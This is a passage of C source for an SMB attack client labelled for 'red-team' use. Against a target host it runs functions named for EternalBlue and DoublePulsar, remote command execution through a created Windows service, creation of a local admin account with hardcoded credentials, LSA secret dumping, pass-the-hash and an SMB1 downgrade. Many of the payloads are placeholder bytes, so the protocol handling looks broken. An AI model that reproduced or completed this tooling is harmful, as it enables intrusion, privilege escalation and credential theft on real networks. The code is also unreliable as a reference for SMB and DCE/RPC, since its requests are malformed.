    uint32_t bytesRead;
    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
    doClosePipe();
    printf("[Client] Named pipe impersonation attempt completed.\n");
    return 0;
}

int doEternalBlueExploit() {
    SMB2Header hdr;
    buildSMB2Header(SMB2_WRITE, gTreeId, gSessionId, &hdr);
    unsigned char ebData[256];
    memset(ebData, 0x41, sizeof(ebData));
    ebData[0] = 0x45;
    ebData[1] = 0x42;
    if (sendSMB2Request(&hdr, ebData, sizeof(ebData)) < 0) {
        fprintf(stderr, "EternalBlue exploit send failed.\n");
        return -1;
    }
    SMB2Header respHdr;
    unsigned char buf[512];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
        fprintf(stderr, "EternalBlue exploit response failed.\n");
        return -1;
    }
    printf("[Client] EternalBlue exploit attempt status=0x%08X.\n", respHdr.Status);
    return 0;
}

int doDoublePulsarCheck() {
    SMB2Header hdr;
    buildSMB2Header(SMB2_WRITE, gTreeId, gSessionId, &hdr);
    unsigned char dpData[128];
    memset(dpData, 0x44, sizeof(dpData));
    dpData[0] = 0x44;
    dpData[1] = 0x50;
    if (sendSMB2Request(&hdr, dpData, sizeof(dpData)) < 0) {
        fprintf(stderr, "DoublePulsar check send failed.\n");
        return -1;
    }
    SMB2Header respHdr;
    unsigned char buf[512];
    ssize_t payloadLen;
    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
        fprintf(stderr, "DoublePulsar check response failed.\n");
        return -1;
    }
    printf("[Client] DoublePulsar check status=0x%08X.\n", respHdr.Status);
    return 0;
}

int doSVCCTLStartService(const char *serviceName) {
    unsigned char dceRequest[256];
    memset(dceRequest, 0, sizeof(dceRequest));
    size_t idx = 0;
    dceRequest[idx++] = 0x05;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x10;
    for (size_t i = 0; i < strlen(serviceName) && idx < 250; i++) {
        dceRequest[idx++] = (unsigned char)serviceName[i];
    }
    dceRequest[idx++] = 0;
    printf("[Client] Attempting to start service: %s\n", serviceName);
    return doWritePipe(dceRequest, idx);
}

int doSVCCTLStopService(const char *serviceName) {
    unsigned char dceRequest[256];
    memset(dceRequest, 0, sizeof(dceRequest));
    size_t idx = 0;
    dceRequest[idx++] = 0x05;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x20;
    for (size_t i = 0; i < strlen(serviceName) && idx < 250; i++) {
        dceRequest[idx++] = (unsigned char)serviceName[i];
    }
    dceRequest[idx++] = 0;
    printf("[Client] Attempting to stop service: %s\n", serviceName);
    return doWritePipe(dceRequest, idx);
}

int doSVCCTLDeleteService(const char *serviceName) {
    unsigned char dceRequest[256];
    memset(dceRequest, 0, sizeof(dceRequest));
    size_t idx = 0;
    dceRequest[idx++] = 0x05;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x30;
    for (size_t i = 0; i < strlen(serviceName) && idx < 250; i++) {
        dceRequest[idx++] = (unsigned char)serviceName[i];
    }
    dceRequest[idx++] = 0;
    printf("[Client] Attempting to delete service: %s\n", serviceName);
    return doWritePipe(dceRequest, idx);
}

int doSVCCTLRemoteExec(const char *cmd) {
    const char *svcName = "RMTEXEC";
    char binPath[512];
    snprintf(binPath, sizeof(binPath), "C:\\\\Windows\\\\System32\\\\cmd.exe /c %s", cmd);
    if (doSVCCTLCreateService(svcName, binPath) < 0) {
        fprintf(stderr, "Failed to create service for remote exec.\n");
        return -1;
    }
    if (doSVCCTLStartService(svcName) < 0) {
        fprintf(stderr, "Failed to start service for remote exec.\n");
    }
    if (doSVCCTLDeleteService(svcName) < 0) {
        fprintf(stderr, "Failed to delete service after remote exec.\n");
        return -1;
    }
    printf("[Client] RemoteExec on service %s with cmd: %s\n", svcName, cmd);
    return 0;
}

/* New enhancements below for red-team capabilities */

/* Attempt to force negotiation of SMB1 (insecure) */
int doSMB1DowngradeAttack() {
    unsigned char smb1Neg[32];
    memset(smb1Neg, 0x00, sizeof(smb1Neg));
    smb1Neg[0] = 0xFF; smb1Neg[1] = 'S'; smb1Neg[2] = 'M'; smb1Neg[3] = 'B';
    smb1Neg[4] = 0x72; 
    if (send(gSock, smb1Neg, sizeof(smb1Neg), 0) < 0) {
        perror("send SMB1 Negotiate");
        return -1;
    }
    unsigned char resp[256];
    ssize_t r = recv(gSock, resp, sizeof(resp), 0);
    if (r <= 0) {
        fprintf(stderr, "SMB1 Downgrade response error.\n");
        return -1;
    }
    printf("[Client] SMB1 Downgrade attempt done.\n");
    return 0;
}

/* Attempt to create a local admin account over RPC */
int doAddLocalAdmin(const char *username, const char *password) {
    if (doOpenPipe("\\PIPE\\samr") < 0) {
        fprintf(stderr, "Failed to open \\pipe\\samr for local admin creation.\n");
        return -1;
    }
    unsigned char dceRequest[512];
    memset(dceRequest, 0, sizeof(dceRequest));
    size_t idx = 0;
    dceRequest[idx++] = 0x05; 
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x00;
    dceRequest[idx++] = 0x10;
    for (size_t i = 0; i < strlen(username); i++) {
        dceRequest[idx++] = (unsigned char)username[i];
    }
    dceRequest[idx++] = 0;
    for (size_t i = 0; i < strlen(password); i++) {
        dceRequest[idx++] = (unsigned char)password[i];
    }
    dceRequest[idx++] = 0;
    doWritePipe(dceRequest, idx);
    doClosePipe();
    printf("[Client] Attempted to create local admin: %s\n", username);
    return 0;
}

/* Attempt to read LSA secrets or SAM hive data over LSARPC pipe */
int doDumpLSASecrets() {
    if (doOpenPipe("\\PIPE\\lsarpc") < 0) {
        fprintf(stderr, "Failed to open \\pipe\\lsarpc for LSA secrets.\n");
        return -1;
    }
    unsigned char lsaRequest[64];
    memset(lsaRequest, 0x52, sizeof(lsaRequest));
    doWritePipe(lsaRequest, sizeof(lsaRequest));
    unsigned char readBuf[512];
    uint32_t bytesRead = 0;
    doReadPipe(readBuf, sizeof(readBuf), &bytesRead);
    doClosePipe();
    if (bytesRead > 0) {
        printf("[Client] Potential LSA secret data read.\n");
    } else {
        printf("[Client] No LSA secrets returned.\n");
    }
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <server_ip> <server_port>\n", argv[0]);
        fprintf(stderr, "Example: %s 192.168.1.10 445\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *serverIp = argv[1];
    int port = atoi(argv[2]);

    gSock = socket(AF_INET, SOCK_STREAM, 0);
    if (gSock < 0) {
        perror("socket");
        return EXIT_FAILURE;
    }

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(port);
    if (inet_pton(AF_INET, serverIp, &serverAddr.sin_addr) <= 0) {
        perror("inet_pton");
        close(gSock);
        return EXIT_FAILURE;
    }

    if (connect(gSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("connect");
        close(gSock);
        return EXIT_FAILURE;
    }
    printf("[Client] Connected to %s:%d\n", serverIp, port);

    if (doNegotiate() < 0) {
        close(gSock);
        return EXIT_FAILURE;
    }
    if (doSessionSetup() < 0) {
        close(gSock);
        return EXIT_FAILURE;
    }
    char ipcPath[256];
    snprintf(ipcPath, sizeof(ipcPath), "\\\\%s\\IPC$", serverIp);
    if (doTreeConnect(ipcPath) < 0) {
        close(gSock);
        return EXIT_FAILURE;
    }
    if (doOpenPipe("\\PIPE\\svcctl") < 0) {
        close(gSock);
        return EXIT_FAILURE;
    }

    if (doDCERPCBind() < 0) {
        fprintf(stderr, "DCERPC bind stub failed.\n");
    }

    doSVCCTLCreateService("TestSvc", "C:\\Windows\\System32\\cmd.exe /c calc.exe");
    doSRVSVCNetShareEnum();

    unsigned char dummyIoctlData[] = { 0x01, 0x02, 0x03, 0x04 };
    doIOCTL(0x0011C017, dummyIoctlData, sizeof(dummyIoctlData));

    unsigned char readBuf[512];
    memset(readBuf, 0, sizeof(readBuf));
    uint32_t bytesRead = 0;
    if (doReadPipe(readBuf, sizeof(readBuf), &bytesRead) < 0) {
        fprintf(stderr, "Read from pipe failed.\n");
    } else {
        if (bytesRead > 0) {
            printf("[Client] Pipe response (hex):\n");
            for (uint32_t i = 0; i < bytesRead; i++) {
                printf("%02X ", readBuf[i]);
            }
            printf("\n");
        } else {
            printf("[Client] No data returned from pipe.\n");
        }
    }

    doFuzzSMB2(5);
    doLargeReadTest();
    doChainedIOCTLTests();

    if (doClosePipe() < 0) {
        fprintf(stderr, "Failed to close pipe properly.\n");
    }

    doSamrEnumUsers();
    doSMBGhostProbe();
    doMS17_010Check();
    doPrinterBug();
    doRemoteRegistryOpen();

    printf("[Client] Now testing additional red-team enhancements...\n");
    doNullSession();
    doPassTheHashSession("DEADBEEFDEADBEEF");
    doEnumerateShares();
    doNamedPipeImpersonation();

    doEternalBlueExploit();
    doDoublePulsarCheck();

    doOpenPipe("\\PIPE\\svcctl");
    doDCERPCBind();
    doSVCCTLStartService("TestSvc");
    doSVCCTLStopService("TestSvc");
    doSVCCTLDeleteService("TestSvc");
    doClosePipe();

    if (doOpenPipe("\\PIPE\\svcctl") == 0) {
        doDCERPCBind();
        doSVCCTLRemoteExec("ipconfig /all");
        doClosePipe();
    }

    printf("[Client] Attempt SMB1 Downgrade Attack...\n");
    doSMB1DowngradeAttack();

    printf("[Client] Attempt to add local admin user...\n");
    doAddLocalAdmin("pwnuser", "PwnPass123!");

    printf("[Client] Attempt to dump LSA secrets...\n");
    doDumpLSASecrets();

    close(gSock);
    printf("[Client] Done.\n");
    return EXIT_SUCCESS;
}